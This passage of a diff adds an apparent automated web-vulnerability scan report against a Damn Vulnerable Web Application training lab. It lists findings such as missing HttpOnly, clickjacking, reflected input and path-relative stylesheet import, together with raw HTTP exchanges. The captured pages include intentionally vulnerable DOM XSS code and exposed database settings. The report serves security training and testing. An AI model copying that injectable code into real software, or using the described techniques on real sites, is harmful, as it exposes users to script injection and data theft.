+<li onclick="window.location='../../vulnerabilities/csrf/'" class=""><a href="../../vulnerabilities/csrf/">CSRF</a></li>
+<li onclick="window.location='../../vulnerabilities/fi/.?page=include.php'" class=""><a href="../../vulnerabilities/fi/.?page=include.php">File Inclusion</a></li>
+<li onclick="window.location='../../vulnerabilities/upload/'" class=""><a href="../../vulnerabilities/upload/">File Upload</a></li>
+<li onclick="window.location='../../vulnerabilities/captcha/'" class=""><a href="../../vulnerabilities/captcha/">Insecure CAPTCHA</a></li>
+<li onclick="window.location='../../vulnerabilities/sqli/'" class=""><a href="../../vulnerabilities/sqli/">SQL Injection</a></li>
+<li onclick="window.location='../../vulnerabilities/sqli_blind/'" class=""><a href="../../vulnerabilities/sqli_blind/">SQL Injection (Blind)</a></li>
+<li onclick="window.location='../../vulnerabilities/weak_id/'" class=""><a href="../../vulnerabilities/weak_id/">Weak Session IDs</a></li>
+<li onclick="window.location='../../vulnerabilities/xss_d/'" class="selected"><a href="../../vulnerabilities/xss_d/">XSS (DOM)</a></li>
+<li onclick="window.location='../../vulnerabilities/xss_r/'" class=""><a href="../../vulnerabilities/xss_r/">XSS (Reflected)</a></li>
+<li onclick="window.location='../../vulnerabilities/xss_s/'" class=""><a href="../../vulnerabilities/xss_s/">XSS (Stored)</a></li>
+</ul><ul class="menuBlocks"><li onclick="window.location='../../security.php'" class=""><a href="../../security.php">DVWA Security</a></li>
+<li onclick="window.location='../../phpinfo.php'" class=""><a href="../../phpinfo.php">PHP Info</a></li>
+<li onclick="window.location='../../about.php'" class=""><a href="../../about.php">About</a></li>
+</ul><ul class="menuBlocks"><li onclick="window.location='../../logout.php'" class=""><a href="../../logout.php">Logout</a></li>
+</ul>
+				</div>
+
+			</div>
+
+			<div id="main_body">
+
+				<div class="body_padded">
+	<h1>Vulnerability: DOM Based Cross Site Scripting (XSS)</h1>
+
+	<div class="vulnerable_code_area">
+ 
+ 		<p>Please choose a language:</p>
+
+		<form name="XSS" method="GET">
+			<select name="default">
+				<script>
+					if (document.location.href.indexOf("default=") >= 0) {
+						var lang = document.location.href.substring(document.location.href.indexOf("default=")+8);
+						document.write("<option value='" + lang + "'>" + (lang) + "</option>");
+						document.write("<option value='' disabled='disabled'>----</option>");
+					}
+					    
+					document.write("<option value='English'>English</option>");
+					document.write("<option value='French'>French</option>");
+					document.write("<option value='Spanish'>Spanish</option>");
+					document.write("<option value='German'>German</option>");
+				</script>
+			</select>
+			<input type="submit" value="Select" />
+		</form>
+	</div>
+	<h2>More Information</h2>
+	<ul>
+		<li><a href="https://www.owasp.org/index.php/Cross-site_Scripting_(XSS)" target="_blank">https://www.owasp.org/index.php/Cross-site_Scripting_(XSS)</a></li>
+		<li><a href="https://www.owasp.org/index.php/Testing_for_DOM-based_Cross_site_scripting_(OTG-CLIENT-001)" target="_blank">https://www.owasp.org/index.php/Testing_for_DOM-based_Cross_site_scripting_(OTG-CLIENT-001)</a></li>
+		<li><a href="https://www.acunetix.com/blog/articles/dom-xss-explained/" target="_blank">https://www.acunetix.com/blog/articles/dom-xss-explained/</a></li>
+	</ul>
+</div>
+
+				<br /><br />
+				
+
+			</div>
+
+			<div class="clear">
+			</div>
+
+			<div id="system_info">
+				<input type="button" value="View Help" class="popup_button" onclick="javascript:popUp( '../../vulnerabilities/view_help.php?id=xss_d&security=impossible' )"> <input type="button" value="View Source" class="popup_button" onclick="javascript:popUp( '../../vulnerabilities/view_source.php?id=xss_d&security=impossible' )"> <div align="left"><em>Username:</em> admin<br /><em>Security Level:</em> impossible<br /><em>PHPIDS:</em> disabled</div>
+			</div>
+
+			<div id="footer">
+
+				<p>Damn Vulnerable Web Application (DVWA) v1.10 *Development*</p>
+
+			</div>
+
+		</div>
+
+	</body>
+
+</html>]]></response>
+      <responseRedirected>false</responseRedirected>
+    </requestresponse>
+  </issue>
+  <issue>
+    <serialNumber>2177342891542254592</serialNumber>
+    <type>5244416</type>
+    <name><![CDATA[Cookie without HttpOnly flag set]]></name>
+    <host ip="45.33.74.114">http://6dwib62km8jeau3p8lpj07pks.us-east1.attackdefenselabs.com</host>
+    <path><![CDATA[/login.php]]></path>
+    <location><![CDATA[/login.php]]></location>
+    <severity>Low</severity>
+    <confidence>Certain</confidence>
+    <issueBackground><![CDATA[<p>If the HttpOnly attribute is set on a cookie, then the cookie's value cannot be read or set by client-side JavaScript. This measure makes certain client-side attacks, such as cross-site scripting, slightly harder to exploit by preventing them from trivially capturing the cookie's value via an injected script.</p>]]></issueBackground>
+    <remediationBackground><![CDATA[<p>There is usually no good reason not to set the HttpOnly flag on all cookies. Unless you specifically require legitimate client-side scripts within your application to read or set a cookie's value, you should set the HttpOnly flag by including this attribute within the relevant Set-cookie directive.</p>
+<p>You should be aware that the restrictions imposed by the HttpOnly flag can potentially be circumvented in some circumstances, and that numerous other serious attacks can be delivered by client-side script injection, aside from simple cookie stealing. </p>]]></remediationBackground>
+    <references><![CDATA[<ul>
+<li><a href='https://www.owasp.org/index.php/HttpOnly'>Configuring HttpOnly</a></li>
+</ul>]]></references>
+    <vulnerabilityClassifications><![CDATA[<ul>
+<li><a href="https://cwe.mitre.org/data/definitions/16.html">CWE-16: Configuration</a></li>
+</ul>]]></vulnerabilityClassifications>
+    <issueDetail><![CDATA[The following cookie was issued by the application and does not have the HttpOnly flag set:<ul><li><b>PHPSESSID</b></li></ul>The cookie appears to contain a session token, which may increase the risk associated with this issue. You should review the contents of the cookie to determine its function.]]></issueDetail>
+    <issueDetailItems>
+      <issueDetailItem><![CDATA[Session: PHPSESSID]]></issueDetailItem>
+    </issueDetailItems>
+    <requestresponse>
+      <request method="GET" base64="false"><![CDATA[GET /login.php HTTP/1.1
+Host: 6dwib62km8jeau3p8lpj07pks.us-east1.attackdefenselabs.com
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: close
+Upgrade-Insecure-Requests: 1
+Pragma: no-cache
+Cache-Control: no-cache
+
+]]></request>
+      <response base64="false"><![CDATA[HTTP/1.1 200 OK
+Cache-Control: no-cache, must-revalidate
+Content-Length: 1523
+Content-Type: text/html;charset=utf-8
+Date: Sun, 15 Sep 2019 22:21:53 GMT
+Expires: Tue, 23 Jun 2009 12:00:00 GMT
+Pragma: no-cache
+Server: Apache/2.4.7 (Ubuntu)
+Set-Cookie: PHPSESSID=vn7g64lhc77qmdrt0e1m9crlt2; path=/
+Set-Cookie: PHPSESSID=vn7g64lhc77qmdrt0e1m9crlt2; path=/; httponly
+Set-Cookie: security=impossible; httponly
+Vary: Accept-Encoding
+X-Powered-By: PHP/5.5.9-1ubuntu4.25
+Connection: close
+
+
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
+
+<html xmlns="http://www.w3.org/1999/xhtml">
+
+	<head>
+
+		<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+
+		<title>Login :: Damn Vulnerable Web Application (DVWA) v1.10 *Development*</title>
+
+		<link rel="stylesheet" type="text/css" href="dvwa/css/login.css" />
+
+	</head>
+
+	<body>
+
+	<div id="wrapper">
+
+	<div id="header">
+
+	<br />
+
+	<p><img src="dvwa/images/login_logo.png" /></p>
+
+	<br />
+
+	</div> <!--<div id="header">-->
+
+	<div id="content">
+
+	<form action="login.php" method="post">
+
+	<fieldset>
+
+			<label for="user">Username</label> <input type="text" class="loginInput" size="20" name="username"><br />
+
+
+			<label for="pass">Password</label> <input type="password" class="loginInput" AUTOCOMPLETE="off" size="20" name="password"><br />
+
+			<br />
+
+			<p class="submit"><input type="submit" value="Login" name="Login"></p>
+
+	</fieldset>
+
+	<input type='hidden' name='user_token' value='ceff2d5bdc7cf2ab1fb9d9c98e1e5175' />
+
+	</form>
+
+	<br />
+
+	
+
+	<br />
+	<br />
+	<br />
+	<br />
+	<br />
+	<br />
+	<br />
+	<br />
+
+	<!-- <img src="dvwa/images/RandomStorm.png" /> -->
+	</div > <!--<div id="content">-->
+
+	<div id="footer">
+
+	<p><a href="http://www.dvwa.co.uk/" target="_blank">Damn Vulnerable Web Application (DVWA)</a></p>
+
+	</div> <!--<div id="footer"> -->
+
+	</div> <!--<div id="wrapper"> -->
+
+	</body>
+
+</html>]]></response>
+      <responseRedirected>false</responseRedirected>
+    </requestresponse>
+  </issue>
+  <issue>
+    <serialNumber>8073660479322223616</serialNumber>
+    <type>5245344</type>
+    <name><![CDATA[Frameable response (potential Clickjacking)]]></name>
+    <host ip="45.33.74.114">http://6dwib62km8jeau3p8lpj07pks.us-east1.attackdefenselabs.com</host>
+    <path><![CDATA[/setup.php]]></path>
+    <location><![CDATA[/setup.php]]></location>
+    <severity>Information</severity>
+    <confidence>Firm</confidence>
+    <issueBackground><![CDATA[<p>If a page fails to set an appropriate X-Frame-Options or Content-Security-Policy HTTP header, it might be possible for a page controlled by an attacker to load it within an iframe. This may enable a clickjacking attack, in which the attacker's page overlays the target application's interface with a different interface provided by the attacker. By inducing victim users to perform actions such as mouse clicks and keystrokes, the attacker can cause them to unwittingly carry out actions within the application that is being targeted. This technique allows the attacker to circumvent defenses against cross-site request forgery, and may result in unauthorized actions.</p>
+<p>Note that some applications attempt to prevent these attacks from within the HTML page itself, using "framebusting" code. However, this type of defense is normally ineffective and can usually be circumvented by a skilled attacker.</p>
+<p>You should determine whether any functions accessible within frameable pages can be used by application users to perform any sensitive actions within the application. </p>]]></issueBackground>
+    <remediationBackground><![CDATA[<p>To effectively prevent framing attacks, the application should return a response header with the name <b>X-Frame-Options</b> and the value <b>DENY</b> to prevent framing altogether, or the value <b>SAMEORIGIN</b> to allow framing only by pages on the same origin as the response itself. Note that the SAMEORIGIN header can be partially bypassed if the application itself can be made to frame untrusted websites.</p>]]></remediationBackground>
+    <references><![CDATA[<ul><li><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/X-Frame-Options">X-Frame-Options</a></li></ul>]]></references>
+    <vulnerabilityClassifications><![CDATA[<ul>
+<li><a href="https://cwe.mitre.org/data/definitions/693.html">CWE-693: Protection Mechanism Failure</a></li>
+</ul>]]></vulnerabilityClassifications>
+    <requestresponse>
+      <request method="GET" base64="false"><![CDATA[GET /setup.php HTTP/1.1
+Host: 6dwib62km8jeau3p8lpj07pks.us-east1.attackdefenselabs.com
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://6dwib62km8jeau3p8lpj07pks.us-east1.attackdefenselabs.com/
+Cookie: PHPSESSID=jpd63unhelu61ihvajg5nke5a0; security=impossible
+Connection: close
+Upgrade-Insecure-Requests: 1
+
+]]></request>
+      <response base64="false"><![CDATA[HTTP/1.1 200 OK
+Cache-Control: no-cache, must-revalidate
+Content-Length: 6191
+Content-Type: text/html;charset=utf-8
+Date: Sun, 15 Sep 2019 22:21:45 GMT
+Expires: Tue, 23 Jun 2009 12:00:00 GMT
+Pragma: no-cache
+Server: Apache/2.4.7 (Ubuntu)
+Vary: Accept-Encoding
+X-Powered-By: PHP/5.5.9-1ubuntu4.25
+Connection: close
+
+
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
+
+<html xmlns="http://www.w3.org/1999/xhtml">
+
+	<head>
+		<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+
+		<title>Setup :: Damn Vulnerable Web Application (DVWA) v1.10 *Development*</title>
+
+		<link rel="stylesheet" type="text/css" href="dvwa/css/main.css" />
+
+		<link rel="icon" type="\image/ico" href="favicon.ico" />
+
+		<script type="text/javascript" src="dvwa/js/dvwaPage.js"></script>
+
+	</head>
+
+	<body class="home">
+		<div id="container">
+
+			<div id="header">
+
+				<img src="dvwa/images/logo.png" alt="Damn Vulnerable Web Application" />
+
+			</div>
+
+			<div id="main_menu">
+
+				<div id="main_menu_padded">
+				<ul class="menuBlocks"><li onclick="window.location='.'" class=""><a href=".">Home</a></li>
+<li onclick="window.location='instructions.php'" class=""><a href="instructions.php">Instructions</a></li>
+<li onclick="window.location='setup.php'" class="selected"><a href="setup.php">Setup / Reset DB</a></li>
+</ul><ul class="menuBlocks"><li onclick="window.location='vulnerabilities/brute/'" class=""><a href="vulnerabilities/brute/">Brute Force</a></li>
+<li onclick="window.location='vulnerabilities/exec/'" class=""><a href="vulnerabilities/exec/">Command Injection</a></li>
+<li onclick="window.location='vulnerabilities/csrf/'" class=""><a href="vulnerabilities/csrf/">CSRF</a></li>
+<li onclick="window.location='vulnerabilities/fi/.?page=include.php'" class=""><a href="vulnerabilities/fi/.?page=include.php">File Inclusion</a></li>
+<li onclick="window.location='vulnerabilities/upload/'" class=""><a href="vulnerabilities/upload/">File Upload</a></li>
+<li onclick="window.location='vulnerabilities/captcha/'" class=""><a href="vulnerabilities/captcha/">Insecure CAPTCHA</a></li>
+<li onclick="window.location='vulnerabilities/sqli/'" class=""><a href="vulnerabilities/sqli/">SQL Injection</a></li>
+<li onclick="window.location='vulnerabilities/sqli_blind/'" class=""><a href="vulnerabilities/sqli_blind/">SQL Injection (Blind)</a></li>
+<li onclick="window.location='vulnerabilities/weak_id/'" class=""><a href="vulnerabilities/weak_id/">Weak Session IDs</a></li>
+<li onclick="window.location='vulnerabilities/xss_d/'" class=""><a href="vulnerabilities/xss_d/">XSS (DOM)</a></li>
+<li onclick="window.location='vulnerabilities/xss_r/'" class=""><a href="vulnerabilities/xss_r/">XSS (Reflected)</a></li>
+<li onclick="window.location='vulnerabilities/xss_s/'" class=""><a href="vulnerabilities/xss_s/">XSS (Stored)</a></li>
+</ul><ul class="menuBlocks"><li onclick="window.location='security.php'" class=""><a href="security.php">DVWA Security</a></li>
+<li onclick="window.location='phpinfo.php'" class=""><a href="phpinfo.php">PHP Info</a></li>
+<li onclick="window.location='about.php'" class=""><a href="about.php">About</a></li>
+</ul><ul class="menuBlocks"><li onclick="window.location='logout.php'" class=""><a href="logout.php">Logout</a></li>
+</ul>
+				</div>
+
+			</div>
+
+			<div id="main_body">
+
+				
+<div class="body_padded">
+	<h1>Database Setup <img src="dvwa/images/spanner.png" /></h1>
+
+	<p>Click on the 'Create / Reset Database' button below to create or reset your database.<br />
+	If you get an error make sure you have the correct user credentials in: <em>/app/config/config.inc.php</em></p>
+
+	<p>If the database already exists, <em>it will be cleared and the data will be reset</em>.<br />
+	You can also use this to reset the administrator credentials ("<em>admin</em> // <em>password</em>") at any stage.</p>
+	<hr />
+	<br />
+
+	<h2>Setup Check</h2>
+
+	Operating system: <em>*nix</em><br />
+	Backend database: <em>MySQL</em><br />
+	PHP version: <em>5.5.9-1ubuntu4.25</em><br />
+	<br />
+	Web Server SERVER_NAME: <em>6dwib62km8jeau3p8lpj07pks.us-east1.attackdefenselabs.com</em><br />
+	<br />
+	PHP function display_errors: <em>Disabled</em><br />
+	PHP function safe_mode: <span class="success">Disabled</span><br/ >
+	PHP function allow_url_include: <span class="success">Enabled</span><br/ >
+	PHP function allow_url_fopen: <span class="success">Enabled</span><br />
+	PHP function magic_quotes_gpc: <span class="success">Disabled</span><br />
+	PHP module gd: <span class="success">Installed</span><br />
+	PHP module mysql: <span class="success">Installed</span><br />
+	PHP module pdo_mysql: <span class="success">Installed</span><br />
+	<br />
+	MySQL username: <em>root</em><br />
+	MySQL password: <em>*blank*</em><br />
+	MySQL database: <em>dvwa</em><br />
+	MySQL host: <em>127.0.0.1</em><br />
+	<br />
+	reCAPTCHA key: <span class="success">6LdK7xITAAzzAAJQTfL7fu6I-0aPl8KHHieAT_yJg</span><br />
+	<br />
+	[User: root] Writable folder /app/hackable/uploads/: <span class="success">Yes</span><br />
+	[User: root] Writable file /app/external/phpids/0.6/lib/IDS/tmp/phpids_log.txt: <span class="success">Yes</span><br />
+	<br />
+	<br />
+	[User: root] Writable folder /app/config: <span class="success">Yes</span>
+	<br />
+	<i><span class="failure">Status in red</span>, indicate there will be an issue when trying to complete some modules.</i><br />
+	<br />
+	If you see disabled on either <i>allow_url_fopen</i> or <i>allow_url_include</i>, set the following in your php.ini file and restart Apache.<br />
+	<pre><code>allow_url_fopen = On
+allow_url_include = On</code></pre>
+	These are only required for the file inclusion labs so unless you want to play with those, you can ignore them.
+
+	<br /><br /><br />
+
+	<!-- Create db button -->
+	<form action="#" method="post">
+		<input name="create_db" type="submit" value="Create / Reset Database">
+		<input type='hidden' name='user_token' value='c5b11e14248d7e5650d73edf87881ee1' />
+	</form>
+	<br />
+	<hr />
+</div>
+				<br /><br />
+				
+
+			</div>
+
+			<div class="clear">
+			</div>
+
+			<div id="system_info">
+				<div align="left"><em>Username:</em> admin<br /><em>Security Level:</em> impossible<br /><em>PHPIDS:</em> disabled</div>
+			</div>
+
+			<div id="footer">
+
+				<p>Damn Vulnerable Web Application (DVWA) v1.10 *Development*</p>
+
+			</div>
+
+		</div>
+
+	</body>
+
+</html>]]></response>
+      <responseRedirected>false</responseRedirected>
+    </requestresponse>
+  </issue>
+  <issue>
+    <serialNumber>8157072535605281792</serialNumber>
+    <type>4197376</type>
+    <name><![CDATA[Input returned in response (reflected)]]></name>
+    <host ip="45.33.74.114">http://6dwib62km8jeau3p8lpj07pks.us-east1.attackdefenselabs.com</host>
+    <path><![CDATA[/dvwa/css/login.css]]></path>
+    <location><![CDATA[/dvwa/css/login.css [URL path filename]]]></location>
+    <severity>Information</severity>
+    <confidence>Certain</confidence>
+    <issueBackground><![CDATA[<p>Reflection of input arises when data is copied from a request and echoed into the application's immediate response.</p><p>Input being returned in application responses is not a vulnerability in its own right. However, it is a prerequisite for many client-side vulnerabilities, including cross-site scripting, open redirection, content spoofing, and response header injection. Additionally, some server-side vulnerabilities such as SQL injection are often easier to identify and exploit when input is returned in responses. In applications where input retrieval is rare and the environment is resistant to automated testing (for example, due to a web application firewall), it might be worth subjecting instances of it to focused manual testing. </p>]]></issueBackground>
+    <vulnerabilityClassifications><![CDATA[<ul>
+<li><a href="https://cwe.mitre.org/data/definitions/20.html">CWE-20: Improper Input Validation</a></li>
+<li><a href="https://cwe.mitre.org/data/definitions/116.html">CWE-116: Improper Encoding or Escaping of Output</a></li>
+</ul>]]></vulnerabilityClassifications>
+    <issueDetail><![CDATA[The value of the URL path filename is copied into the application's response.]]></issueDetail>
+    <requestresponse>
+      <request method="GET" base64="false"><![CDATA[GET /dvwa/css/login.css3jgxkklseh HTTP/1.1
+Host: 6dwib62km8jeau3p8lpj07pks.us-east1.attackdefenselabs.com
+Accept-Encoding: gzip, deflate
+Accept: */*
+Accept-Language: en-US,en-GB;q=0.9,en;q=0.8
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36
+Connection: close
+Cache-Control: max-age=0
+Referer: http://6dwib62km8jeau3p8lpj07pks.us-east1.attackdefenselabs.com/login.php
+Cookie: PHPSESSID=uep8qhgc479q865ki0hg1q9hf7; security=impossible
+
+]]></request>
+      <response base64="false"><![CDATA[HTTP/1.1 404 Not Found
+Content-Length: 347
+Content-Type: text/html; charset=iso-8859-1
+Date: Sun, 15 Sep 2019 22:20:54 GMT
+Server: Apache/2.4.7 (Ubuntu)
+Connection: close
+
+<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
+<html><head>
+<title>404 Not Found</title>
+</head><body>
+<h1>Not Found</h1>
+<p>The requested URL /dvwa/css/login.css3jgxkklseh was not found on this server.</p>
+<hr>
+<address>Apache/2.4.7 (Ubuntu) Server at 6dwib62km8jeau3p8lpj07pks.us-east1.attackdefenselabs.com Port 80</address>
+</body></html>
+]]></response>
+      <responseRedirected>false</responseRedirected>
+    </requestresponse>
+  </issue>
+  <issue>
+    <serialNumber>7262341059307542528</serialNumber>
+    <type>2097960</type>
+    <name><![CDATA[Path-relative style sheet import]]></name>
+    <host ip="45.33.74.114">http://6dwib62km8jeau3p8lpj07pks.us-east1.attackdefenselabs.com</host>
+    <path><![CDATA[/login.php]]></path>
+    <location><![CDATA[/login.php]]></location>
+    <severity>Information</severity>
+    <confidence>Firm</confidence>
+    <issueBackground><![CDATA[<p>Path-relative style sheet import vulnerabilities arise when the following conditions hold:</p>
+<ol>
+<li>A response contains a style sheet import that uses a path-relative URL (for example, the page at "/original-path/file.php" might import "styles/main.css").</li><li>When handling requests, the application or platform tolerates superfluous path-like data following the original filename in the URL (for example, "/original-path/file.php/extra-junk/"). When superfluous data is added to the original URL, the application's response still contains a path-relative stylesheet import.</li><li>The response in condition 2 can be made to render in a browser's quirks mode, either because it has a missing or old doctype directive, or because it allows itself to be framed by a page under an attacker's control.</li>
+<li>When a browser requests the style sheet that is imported in the response from the modified URL (using the URL "/original-path/file.php/extra-junk/styles/main.css"), the application returns something other than the CSS response that was supposed to be imported. Given the behavior described in condition 2, this will typically be the same response that was originally returned in condition 1.</li><li>An attacker has a means of manipulating some text within the response in condition 4, for example because the application stores and displays some past input, or echoes some text within the current URL.</li></ol>
+<p>Given the above conditions, an attacker can execute CSS injection within the browser of the target user. The attacker can construct a URL that causes the victim's browser to import as CSS a different URL than normal, containing text that the attacker can manipulate.</p>
+<p>Being able to inject arbitrary CSS into the victim's browser may enable various attacks, including:</p>
+<ul>
+  <li>Executing arbitrary JavaScript using IE's expression() function.</li><li>Using CSS selectors to read parts of the HTML source, which may include sensitive data such as anti-CSRF tokens.</li>
+<li>Capturing any sensitive data within the URL query string by making a further style sheet import to a URL on the attacker's domain, and monitoring the incoming Referer header.</li></ul>]]></issueBackground>
+    <remediationBackground><![CDATA[<p>The root cause of the vulnerability can be resolved by not using path-relative URLs in style sheet imports. Aside from this, attacks can also be prevented by implementing all of the following defensive measures: </p>
+<ul><li>Setting the HTTP response header "X-Frame-Options: deny" in all responses. One method that an attacker can use to make a page render in quirks mode is to frame it within their own page that is rendered in quirks mode. Setting this header prevents the page from being framed.</li><li>Setting a modern doctype (e.g. "&lt;!doctype html&gt;") in all HTML responses. This prevents the page from being rendered in quirks mode (unless it is being framed, as described above).</li>
+<li>Setting the HTTP response header "X-Content-Type-Options: nosniff" in all responses. This prevents the browser from processing a non-CSS response as CSS, even if another page loads the response via a style sheet import.</li></ul>]]></remediationBackground>
+    <references><![CDATA[<ul><li><a href="http://blog.portswigger.net/2015/02/prssi.html">Detecting and exploiting path-relative stylesheet import (PRSSI) vulnerabilities</a></li></ul>]]></references>
+    <vulnerabilityClassifications><![CDATA[<ul>
+<li><a href="https://cwe.mitre.org/data/definitions/16.html">CWE-16: Configuration</a></li>
+</ul>]]></vulnerabilityClassifications>
+    <issueDetail><![CDATA[The application may be vulnerable to path-relative style sheet import (PRSSI) attacks. The first four conditions for an exploitable vulnerability are present (see issue background):<ol><li>The original response contains a path-relative style sheet import (see response 1).</li><li>When superfluous path-like data is placed into the URL following the original filename (see request 2), the application's response still contains a path-relative style sheet import (see response 2).</li><li>Response 2 can be made to render in a browser's quirks mode. The page does not contain a doctype directive, and so it will always be rendered in quirks mode. Further, the response does not prevent itself from being framed, so an attacker can frame the response within a page that they control, to force it to be rendered in quirks mode. (Note that this technique is IE-specific and due to P3P restrictions might sometimes limit the impact of a successful attack.)</li><li>When the path-relative style sheet import in response 2 is requested (see request 3) the application returns something other than the CSS response that was supposed to be imported (see response 3).</li></ol>It was not verified whether condition 5 holds (see issue background), and you should manually investigate whether it is possible to manipulate some text within response 3, to enable full exploitation of this issue.]]></issueDetail>
+    <requestresponse>
+      <request method="GET" base64="false"><![CDATA[GET /login.php HTTP/1.1
+Host: 6dwib62km8jeau3p8lpj07pks.us-east1.attackdefenselabs.com
+Accept-Encoding: gzip, deflate
+Accept: */*
+Accept-Language: en-US,en-GB;q=0.9,en;q=0.8
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36
+Connection: close
+Cache-Control: max-age=0
+Referer: http://6dwib62km8jeau3p8lpj07pks.us-east1.attackdefenselabs.com/
+Cookie: PHPSESSID=oa4eb5dg1bt6as9e17ntmscm33; security=impossible
+
+]]></request>
+      <response base64="false"><![CDATA[HTTP/1.1 200 OK
+Cache-Control: no-cache, must-revalidate
+Content-Length: 1523
+Content-Type: text/html;charset=utf-8
+Date: Sun, 15 Sep 2019 22:18:43 GMT
+Expires: Tue, 23 Jun 2009 12:00:00 GMT
+Pragma: no-cache
+Server: Apache/2.4.7 (Ubuntu)
+Vary: Accept-Encoding
+X-Powered-By: PHP/5.5.9-1ubuntu4.25
+Connection: close
+
+
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
+
+<html xmlns="http://www.w3.org/1999/xhtml">
+
+	<head>
+
+		<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+
+		<title>Login :: Damn Vulnerable Web Application (DVWA) v1.10 *Development*</title>
+
+		<link rel="stylesheet" type="text/css" href="dvwa/css/login.css" />
+
+	</head>
+
+	<body>
+
+	<div id="wrapper">
+
+	<div id="header">
+
+	<br />
+
+	<p><img src="dvwa/images/login_logo.png" /></p>
+
+	<br />
+
+	</div> <!--<div id="header">-->
+
+	<div id="content">
+
+	<form action="login.php" method="post">
+
+	<fieldset>
+
+			<label for="user">Username</label> <input type="text" class="loginInput" size="20" name="username"><br />
+
+
+			<label for="pass">Password</label> <input type="password" class="loginInput" AUTOCOMPLETE="off" size="20" name="password"><br />
+
+			<br />
+
+			<p class="submit"><input type="submit" value="Login" name="Login"></p>
+
+	</fieldset>
+
+	<input type='hidden' name='user_token' value='25bf23dbaf4d89c15a2f7b34178a5be4' />
+
+	</form>
+
+	<br />
+
+	
+
+	<br />
+	<br />
+	<br />
+	<br />
+	<br />
+	<br />
+	<br />
+	<br />
+
+	<!-- <img src="dvwa/images/RandomStorm.png" /> -->
+	</div > <!--<div id="content">-->
+
+	<div id="footer">
+
+	<p><a href="http://www.dvwa.co.uk/" target="_blank">Damn Vulnerable Web Application (DVWA)</a></p>
+
+	</div> <!--<div id="footer"> -->
+
+	</div> <!--<div id="wrapper"> -->
+
+	</body>
+
+</html>]]></response>
+      <responseRedirected>false</responseRedirected>
+    </requestresponse>
+    <requestresponse>
+      <request method="GET" base64="false"><![CDATA[GET /login.php/ebqbtg/ HTTP/1.1
+Host: 6dwib62km8jeau3p8lpj07pks.us-east1.attackdefenselabs.com
+Accept-Encoding: gzip, deflate
+Accept: */*
+Accept-Language: en-US,en-GB;q=0.9,en;q=0.8
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36
+Connection: close
+Cache-Control: max-age=0
+Referer: http://6dwib62km8jeau3p8lpj07pks.us-east1.attackdefenselabs.com/
+Cookie: PHPSESSID=oa4eb5dg1bt6as9e17ntmscm33; security=impossible
+
+]]></request>
+      <response base64="false"><![CDATA[HTTP/1.1 200 OK
+Cache-Control: no-cache, must-revalidate
+Content-Length: 1523
+Content-Type: text/html;charset=utf-8
+Date: Sun, 15 Sep 2019 22:20:56 GMT
+Expires: Tue, 23 Jun 2009 12:00:00 GMT
+Pragma: no-cache
+Server: Apache/2.4.7 (Ubuntu)
+Vary: Accept-Encoding
+X-Powered-By: PHP/5.5.9-1ubuntu4.25
+Connection: close
+
+
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
+
+<html xmlns="http://www.w3.org/1999/xhtml">
+
+	<head>
+
+		<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+
+		<title>Login :: Damn Vulnerable Web Application (DVWA) v1.10 *Development*</title>
+
+		<link rel="stylesheet" type="text/css" href="dvwa/css/login.css" />
+
+	</head>
+
+	<body>
+
+	<div id="wrapper">
+
+	<div id="header">
+
+	<br />
+
+	<p><img src="dvwa/images/login_logo.png" /></p>
+
+	<br />
+
+	</div> <!--<div id="header">-->
+
+	<div id="content">
+
+	<form action="login.php" method="post">
+
+	<fieldset>
+
+			<label for="user">Username</label> <input type="text" class="loginInput" size="20" name="username"><br />
+
+
+			<label for="pass">Password</label> <input type="password" class="loginInput" AUTOCOMPLETE="off" size="20" name="password"><br />
+
+			<br />
+
+			<p class="submit"><input type="submit" value="Login" name="Login"></p>
+
+	</fieldset>
+
+	<input type='hidden' name='user_token' value='d147f4a4f5f7532c83e7f6b92cd45dc5' />
+
+	</form>
+
+	<br />
+
+	
+
+	<br />
+	<br />
+	<br />
+	<br />
+	<br />
+	<br />
+	<br />
+	<br />
+
+	<!-- <img src="dvwa/images/RandomStorm.png" /> -->
+	</div > <!--<div id="content">-->
+
+	<div id="footer">
+
+	<p><a href="http://www.dvwa.co.uk/" target="_blank">Damn Vulnerable Web Application (DVWA)</a></p>
+
+	</div> <!--<div id="footer"> -->
+
+	</div> <!--<div id="wrapper"> -->
+
+	</body>
+
+</html>]]></response>
+      <responseRedirected>false</responseRedirected>
+    </requestresponse>
+    <requestresponse>
+      <request method="GET" base64="false"><![CDATA[GET /login.php/ebqbtg/dvwa/css/login.css HTTP/1.1
+Host: 6dwib62km8jeau3p8lpj07pks.us-east1.attackdefenselabs.com
+Accept-Encoding: gzip, deflate
+Accept: */*
